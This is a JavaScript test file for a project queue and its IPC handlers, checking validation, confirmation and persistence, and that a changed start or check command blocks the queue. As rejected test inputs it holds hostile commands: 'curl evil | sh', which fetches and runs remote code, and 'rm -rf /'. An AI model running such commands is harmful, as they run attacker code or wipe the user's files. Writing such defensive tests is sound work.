// ============================================================================
// Luna's Work project queue (src/lunasworkQueue.js, B16) and its IPC
// (src/lunasworkipc.js queue channels): only a project with a valid profile
// and a complete design pack may join, every payload is validated in main,
// the queue survives a restart, and the run email's QUEUE block. The
// controller side (advance only on SHIP) is in lunaswork-controller.test.js.
// ============================================================================

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const q = require('../src/lunasworkQueue');
const pack = require('../src/lunasworkPack');
const settingsStore = require('../src/lunasworkSettings');
const { registerLunasworkIpc, parseQueueRequest } = require('../src/lunasworkipc');

const PROFILE = { adapter: 'web', startCommand: 'npm start', url: 'http://localhost:3000', readyTimeoutSec: 60, checkCommand: '' };
const entry = (projectId, extra = {}) => ({ projectId, label: projectId.toUpperCase(), profile: PROFILE, addedAt: 1, ...extra });
const queueOf = (...ids) => ({ v: 1, entries: ids.map((id) => entry(id)) });
const idsOf = (queue) => queue.entries.map((e) => e.projectId);

const tempDir = () => fs.mkdtempSync(path.join(os.tmpdir(), 'lw-queue-'));

/** A repo whose design pack is complete. */
function fillPack(repo) {
  pack.scaffoldPack(repo);
  const write = (file, text) => fs.writeFileSync(path.join(repo, 'design', file), text);
  write('BRIEF.md', '# Brief\n\n## What it is\n\nA steel quote calculator.\n');
  write('DESIGN.md', '# Design\n\n## Features\n\n- Quote from a drawing\n');
  write('SHIP_CRITERIA.md', '# Ship\n\n## Milestone 1: Skeleton\n\n- [ ] Opens\n');
  pack.applyWrite(repo, pack.appendJourney('Make a quote\n\n1. Open\n2. Expect a total'));
}

// ---- pure ---------------------------------------------------------------------------

test('normalizeQueue keeps valid entries once each, re-validates the profile, caps the list', () => {
  const raw = {
    entries: [
      entry('a'),
      entry('a'),
      entry('b', { profile: { startCommand: '' } }),
      entry('__proto__'),
      entry('c', { label: 'line\nbreak' }),
      'junk',
      ...Array.from({ length: 40 }, (_, i) => entry(`p${i}`)),
    ],
  };
  const out = q.normalizeQueue(raw);
  assert.equal(out.entries.length, q.MAX_ENTRIES);
  assert.deepEqual(idsOf(out).slice(0, 2), ['a', 'c']);
  assert.equal(out.entries[1].label, 'line break');
  assert.deepEqual(q.normalizeQueue('broken'), { v: 1, entries: [] });
});

test('add / remove / move return a new queue and never mutate', () => {
  const start = queueOf('a', 'b', 'c');
  const frozen = JSON.stringify(start);

  assert.deepEqual(idsOf(q.addEntry(start, entry('d')).queue), ['a', 'b', 'c', 'd']);
  assert.equal(q.addEntry(start, entry('a')).reason, 'queued-already');
  assert.equal(q.addEntry(start, { projectId: 'x' }).reason, 'bad-project');
  const full = { v: 1, entries: Array.from({ length: q.MAX_ENTRIES }, (_, i) => entry(`p${i}`)) };
  assert.equal(q.addEntry(full, entry('z')).reason, 'queue-full');

  assert.deepEqual(idsOf(q.removeEntry(start, 'b').queue), ['a', 'c']);
  assert.equal(q.removeEntry(start, 'zz').reason, 'not-queued');

  assert.deepEqual(idsOf(q.moveEntry(start, 'c', -1).queue), ['a', 'c', 'b']);
  assert.deepEqual(idsOf(q.moveEntry(start, 'a', 1).queue), ['b', 'a', 'c']);
  assert.equal(q.moveEntry(start, 'a', -1).reason, 'bad-move');
  assert.equal(q.moveEntry(start, 'c', 1).reason, 'bad-move');
  assert.equal(q.moveEntry(start, 'b', 2).reason, 'bad-move');
  assert.equal(q.moveEntry(start, 'zz', 1).reason, 'not-queued');

  assert.equal(JSON.stringify(start), frozen);
});

test('joinProblem: a known project with a folder, a valid profile and a complete pack only', () => {
  const ok = { project: { id: 'a' }, repoPath: '/r', profile: PROFILE, pack: { complete: true } };
  assert.equal(q.joinProblem(ok), null);
  assert.equal(q.joinProblem({ ...ok, project: null }), 'bad-project');
  assert.equal(q.joinProblem({ ...ok, repoPath: null }), 'no-folder');
  assert.equal(q.joinProblem({ ...ok, profile: null }), 'no-profile');
  assert.equal(q.joinProblem({ ...ok, profile: { startCommand: '' } }), 'no-profile');
  assert.equal(q.joinProblem({ ...ok, pack: { complete: false, missing: ['BRIEF.md'] } }), 'pack-incomplete');
  assert.equal(q.joinProblem({ ...ok, pack: null }), 'pack-incomplete');
});

test('planAfterRun: only SHIP advances, and only when the start checks pass with the pinned profile', () => {
  const queue = queueOf('a', 'b');
  const fine = () => ({ profile: PROFILE });
  assert.equal(q.planAfterRun({ entries: [] }, { verdict: 'ship' }, fine), null);

  const ship = q.planAfterRun(queue, { verdict: 'ship' }, fine);
  assert.equal(q.planAfterRun(queue, { verdict: 'ship' }, () => ({ profile: PROFILE, checkCommand: 'evil' })).note.state, 'blocked');
  assert.equal(q.planAfterRun(queue, { verdict: 'ship' }, () => ({ profile: PROFILE, scaffold: { stack: 'nextjs' } })).note.state, 'blocked');
  assert.equal(ship.next.projectId, 'a');
  assert.deepEqual(ship.note, { verdict: 'ship', waiting: 1, nextLabel: 'A', state: 'advancing' });

  for (const verdict of ['plateau', 'red', 'stop', undefined]) {
    const res = q.planAfterRun(queue, { verdict }, () => assert.fail('no start check without SHIP'));
    assert.equal(res.next, null);
    assert.equal(res.note.state, 'paused');
    assert.equal(res.note.waiting, 2);
  }

  const refused = q.planAfterRun(queue, { verdict: 'ship' }, () => ({ refusal: { reason: 'god-mode-active', message: 'God Mode has a plan' } }));
  assert.equal(refused.next, null);
  assert.deepEqual([refused.note.state, refused.note.why], ['blocked', 'God Mode has a plan']);

  const changed = q.planAfterRun(queue, { verdict: 'ship' }, () => ({ profile: { ...PROFILE, startCommand: 'rm -rf /' } }));
  assert.equal(changed.next, null);
  assert.match(changed.note.why, /commands changed/);

  const thrown = q.planAfterRun(queue, { verdict: 'ship' }, () => {
    throw new Error('C:/Users/secret/path failed');
  });
  assert.equal(thrown.note.why, 'the start check failed');

  // A queued project that shipped from a manual start never restarts itself.
  const self = q.planAfterRun(queue, { verdict: 'ship', projectId: 'a' }, fine);
  assert.equal(self.next.projectId, 'b');
  assert.equal(self.note.waiting, 0);
  assert.equal(q.planAfterRun(queueOf('a'), { verdict: 'ship', projectId: 'a' }, fine), null);
});

test('queueEmailNote says whether the queue goes on or is paused', () => {
  assert.equal(q.queueEmailNote(null), '');
  assert.match(q.queueEmailNote({ state: 'advancing', waiting: 0, nextLabel: 'B', verdict: 'ship' }), /^QUEUE\n- Next in the queue: "B" starts now\. The queue is empty after it\./);
  const paused = q.queueEmailNote({ state: 'paused', waiting: 2, nextLabel: 'B', verdict: 'plateau' });
  assert.match(paused, /Queue paused: the run ended with PLATEAU/);
  assert.match(paused, /2 projects wait/);
  assert.match(q.queueEmailNote({ state: 'blocked', waiting: 1, nextLabel: 'B', why: 'God Mode', verdict: 'ship' }), /Queue paused: "B" could not start \(God Mode\)\. 1 project wait/);
});

test('startQueued takes the entry off the queue only once its run started', async () => {
  let stored = queueOf('a', 'b');
  const store = { read: () => stored, write: (next) => ((stored = next), true) };
  const refused = await q.startQueued({ store, entry: entry('a'), start: async () => ({ ok: false, reason: 'run-active' }) });
  assert.equal(refused, false);
  assert.deepEqual(idsOf(stored), ['a', 'b']);

  let confirmed = null;
  const started = await q.startQueued({
    store,
    entry: entry('a'),
    start: async (payload, confirm) => {
      confirmed = [
        confirm({ profile: PROFILE, checkCommand: '' }),
        confirm({ profile: { ...PROFILE, url: 'http://evil:1' }, checkCommand: '' }),
        confirm({ profile: PROFILE, checkCommand: 'curl evil | sh' }),
      ];
      return { ok: true, payload };
    },
  });
  assert.equal(started, true);
  assert.deepEqual(confirmed, [true, false, false]);
  assert.deepEqual(idsOf(stored), ['b']);
});

// ---- disk ---------------------------------------------------------------------------

test('the queue survives a restart: written by one store, read by a fresh one', () => {
  const dir = tempDir();
  const file = path.join(dir, 'lunaswork-queue.local.json');
  assert.deepEqual(q.fileQueueStore(file).read(), { v: 1, entries: [] });
  assert.equal(q.fileQueueStore(file).write(queueOf('a', 'b')), true);
  // A "restarted" LunaCore: a new store over the same file.
  assert.deepEqual(idsOf(q.fileQueueStore(file).read()), ['a', 'b']);
  fs.writeFileSync(file, '{ broken');
  assert.deepEqual(q.readQueue(file), { v: 1, entries: [] });
  assert.equal(q.writeQueue(queueOf('a'), path.join(dir, 'no', 'such', 'dir', 'q.json')), false);
  fs.rmSync(dir, { recursive: true, force: true });
});

// ---- IPC ----------------------------------------------------------------------------

function fakeIpc() {
  const handlers = {};
  return { handle: (ch, fn) => (handlers[ch] = fn), invoke: (ch, arg) => handlers[ch]({}, arg), channels: () => Object.keys(handlers) };
}

function setupIpc({ filled = true, profile = true, confirm = true } = {}) {
  const dir = tempDir();
  const repo = path.join(dir, 'repo');
  const other = path.join(dir, 'other');
  fs.mkdirSync(repo);
  fs.mkdirSync(other);
  if (filled) {
    fillPack(repo);
    fillPack(other);
  }
  const settingsFile = path.join(dir, 'lunaswork-settings.local.json');
  let settings = settingsStore.defaultSettings();
  if (profile) {
    for (const id of ['game', 'other']) settings = settingsStore.withProject(settings, id, { profile: PROFILE }).settings;
  }
  settingsStore.writeSettings(settings, settingsFile);
  const queueFile = path.join(dir, 'lunaswork-queue.local.json');
  const changes = [];
  const confirms = [];
  const ipc = fakeIpc();
  const projects = [
    { id: 'game', label: 'Game', path: repo },
    { id: 'other', label: 'Other', path: other },
    { id: 'gone', label: 'Gone', path: path.join(dir, 'missing') },
  ];
  registerLunasworkIpc({
    ipcMain: ipc,
    projects: () => projects,
    createSession: () => null,
    briefDir: () => dir,
    settingsFile,
    resolveDir: (p) => (fs.existsSync(p) ? p : null),
    now: () => 5000,
    queue: q.fileQueueStore(queueFile),
    queueChanged: () => changes.push(1),
    checkCommandFor: (p) => p.checkCommand || 'npm test',
    ...(confirm === null
      ? {}
      : {
        confirmQueueAdd: async (ctx) => {
          confirms.push(ctx);
          return typeof confirm === 'function' ? confirm(ctx) : confirm;
        },
      }),
  });
  return { ipc, dir, queueFile, changes, confirms, projects, done: () => fs.rmSync(dir, { recursive: true, force: true }) };
}

test('queue channels are registered only with a queue store', () => {
  const s = setupIpc();
  for (const ch of ['lunaswork:queueList', 'lunaswork:queueAdd', 'lunaswork:queueRemove', 'lunaswork:queueMove']) {
    assert.ok(s.ipc.channels().includes(ch), ch);
  }
  s.done();
});

test('parseQueueRequest: exactly the known keys, a well-formed id, a delta of -1 or 1', () => {
  assert.deepEqual(parseQueueRequest({ projectId: 'game' }), { projectId: 'game' });
  assert.deepEqual(parseQueueRequest({ projectId: 'game', delta: -1 }, { move: true }), { projectId: 'game', delta: -1 });
  for (const bad of [undefined, null, 'game', [], {}, { projectId: '' }, { projectId: 7 }, { projectId: 'x'.repeat(201) }, { projectId: '__proto__' }, { projectId: 'game', path: 'C:/' }]) {
    assert.equal(parseQueueRequest(bad), null, JSON.stringify(bad));
  }
  for (const delta of [0, 2, -2, '1', 1.5, null, undefined]) {
    assert.equal(parseQueueRequest({ projectId: 'game', delta }, { move: true }), null, String(delta));
  }
  assert.equal(parseQueueRequest({ projectId: 'game', delta: 1 }), null);
});

test('queueAdd: a valid project joins with its profile pinned; the list shows names and commands, never a path', async () => {
  const s = setupIpc();
  const res = await s.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' });
  assert.equal(res.ok, true);
  assert.deepEqual(res.queue, [{ projectId: 'game', label: 'Game', startCommand: 'npm start', url: 'http://localhost:3000', addedAt: 5000 }]);
  assert.equal(s.changes.length, 1);
  assert.deepEqual(q.readQueue(s.queueFile).entries[0].profile, PROFILE);
  // Mati saw the commands natively, with the effective self-check; both pinned.
  assert.equal(s.confirms.length, 1);
  assert.deepEqual([s.confirms[0].profile, s.confirms[0].checkCommand], [PROFILE, 'npm test']);
  assert.equal(q.readQueue(s.queueFile).entries[0].checkCommand, 'npm test');
  assert.ok(!JSON.stringify(res).includes(s.dir));
  assert.deepEqual(await s.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' }), { ok: false, reason: 'queued-already' });
  assert.equal(s.confirms.length, 1);
  s.done();
});

test("queueAdd: nothing joins without Mati's native confirmation", async () => {
  const declined = setupIpc({ confirm: false });
  assert.deepEqual(await declined.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' }), { ok: false, reason: 'queue-declined' });
  assert.equal(fs.existsSync(declined.queueFile), false);
  declined.done();

  // A truthy non-true answer is not a yes.
  const sloppy = setupIpc({ confirm: () => 'yes' });
  assert.deepEqual(await sloppy.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' }), { ok: false, reason: 'queue-declined' });
  sloppy.done();

  const noDialog = setupIpc({ confirm: null });
  assert.deepEqual(await noDialog.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' }), { ok: false, reason: 'queue-busy' });
  noDialog.done();

  // One dialog at a time: a second add while the first waits is refused.
  let release;
  const slow = setupIpc({ confirm: () => new Promise((r) => (release = r)) });
  const first = slow.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' });
  assert.deepEqual(await slow.ipc.invoke('lunaswork:queueAdd', { projectId: 'other' }), { ok: false, reason: 'queue-busy' });
  release(true);
  assert.equal((await first).ok, true);
  slow.done();
});

test('queueAdd refuses an incomplete pack, a missing profile, a missing folder and any bad payload', async () => {
  const noPack = setupIpc({ filled: false });
  assert.deepEqual(await noPack.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' }), { ok: false, reason: 'pack-incomplete' });
  noPack.done();

  const noProfile = setupIpc({ profile: false });
  assert.deepEqual(await noProfile.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' }), { ok: false, reason: 'no-profile' });
  noProfile.done();

  const s = setupIpc();
  assert.deepEqual(await s.ipc.invoke('lunaswork:queueAdd', { projectId: 'gone' }), { ok: false, reason: 'no-folder' });
  for (const req of [undefined, null, 'game', {}, { projectId: 'nope' }, { projectId: 'game', profile: PROFILE }, { projectId: 'game', label: 'x' }]) {
    assert.deepEqual(await s.ipc.invoke('lunaswork:queueAdd', req), { ok: false, reason: 'bad-project' }, JSON.stringify(req));
  }
  assert.equal(fs.existsSync(s.queueFile), false);
  assert.equal(s.changes.length, 0);
  s.done();
});

test('queueMove / queueRemove reorder and remove; bad payloads change nothing', async () => {
  const s = setupIpc();
  await s.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' });
  await s.ipc.invoke('lunaswork:queueAdd', { projectId: 'other' });

  const moved = await s.ipc.invoke('lunaswork:queueMove', { projectId: 'other', delta: -1 });
  assert.deepEqual(moved.queue.map((e) => e.projectId), ['other', 'game']);
  for (const req of [{ projectId: 'other', delta: 5 }, { projectId: 'other' }, { projectId: 'other', delta: -1, extra: 1 }, null]) {
    assert.deepEqual(await s.ipc.invoke('lunaswork:queueMove', req), { ok: false, reason: 'bad-move' }, JSON.stringify(req));
  }
  assert.deepEqual(await s.ipc.invoke('lunaswork:queueMove', { projectId: 'other', delta: -1 }), { ok: false, reason: 'bad-move' });

  assert.deepEqual(await s.ipc.invoke('lunaswork:queueRemove', { projectId: 'nope' }), { ok: false, reason: 'not-queued' });
  assert.deepEqual(await s.ipc.invoke('lunaswork:queueRemove', { projectId: 7 }), { ok: false, reason: 'bad-project' });
  const removed = await s.ipc.invoke('lunaswork:queueRemove', { projectId: 'other' });
  assert.deepEqual(removed.queue.map((e) => e.projectId), ['game']);

  // Persisted: a fresh read (as after a restart) sees the same order.
  assert.deepEqual(idsOf(q.readQueue(s.queueFile)), ['game']);
  assert.deepEqual((await s.ipc.invoke('lunaswork:queueList')).queue.map((e) => e.projectId), ['game']);
  assert.equal(s.changes.length, 4);
  s.done();
});

test('queueList hides entries of projects no longer registered', async () => {
  const s = setupIpc();
  await s.ipc.invoke('lunaswork:queueAdd', { projectId: 'game' });
  s.projects.splice(0, 1);
  assert.deepEqual(await s.ipc.invoke('lunaswork:queueList'), { ok: true, queue: [] });
  s.done();
});

// ---- phone snapshot, sync and run email ---------------------------------------------

const godmodeSnap = require('../src/godmodesnapshot');
const { wireDecisionSync, mailWithNote } = require('../src/lunasworkWiring');

test('phoneQueue sends labels only; the godmode snapshot carries and re-cleans them', () => {
  const list = q.phoneQueue(queueOf('a', 'b', 'gone'), (id) => id !== 'gone');
  assert.deepEqual(list, [{ label: 'A' }, { label: 'B' }]);

  const now = 1_700_000_000_000;
  const snap = godmodeSnap.withLive(null, { queue: [...list, { label: 'x\u0000y', path: 'C:/secret' }, 'junk'] }, { machine: 'PC1', now });
  assert.deepEqual(snap.queue, [{ label: 'A' }, { label: 'B' }, { label: 'x y' }]);
  assert.equal(godmodeSnap.withLive(null, { queue: [] }, { machine: 'PC1', now }).queue, undefined);

  const rows = [{ machine: 'PC1', data: snap }, { machine: 'PC2', data: godmodeSnap.withLive(null, {}, { machine: 'PC2', now }) }];
  assert.deepEqual(godmodeSnap.queueFrom(rows, now), [{ machine: 'PC1', stale: false, items: [{ label: 'A' }, { label: 'B' }, { label: 'x y' }] }]);
  assert.equal(godmodeSnap.queueFrom(rows, now + godmodeSnap.LIVE_STALE_MS + 1)[0].stale, true);
});

test('wireDecisionSync puts the queue on every event and publish(), only when it changed', () => {
  const listeners = [];
  const puts = [];
  let list = [{ label: 'A' }];
  const sync = wireDecisionSync({
    controller: { subscribe: (fn) => listeners.push(fn), status: () => ({}), applyAnswers: () => 0 },
    cloud: null,
    putDecisions: () => {},
    readQueue: () => list,
    putQueue: (l) => puts.push(l),
  });
  sync.publish();
  listeners[0]({ type: 'phase', status: {} });
  assert.deepEqual(puts, [[{ label: 'A' }]]);
  list = [];
  sync.publish();
  assert.deepEqual(puts, [[{ label: 'A' }], []]);
});

test('mailWithNote puts the QUEUE block on top of the run email; no note leaves the mail as it is', async () => {
  const sent = [];
  const mail = { sender: { status: () => ({ connected: true }), send: async (m) => sent.push(m) }, prefs: {}, enabled: () => true };
  assert.equal(mailWithNote(mail, ''), mail);
  const wrapped = mailWithNote(mail, q.queueEmailNote({ state: 'paused', verdict: 'red', waiting: 1, nextLabel: 'B' }));
  assert.deepEqual(wrapped.sender.status(), { connected: true });
  await wrapped.sender.send({ subject: 's', text: 'NEEDS YOU' });
  assert.match(sent[0].text, /^QUEUE\n- Queue paused: the run ended with RED[^\n]*\n\nNEEDS YOU$/);
  assert.equal(sent[0].subject, 's');
});
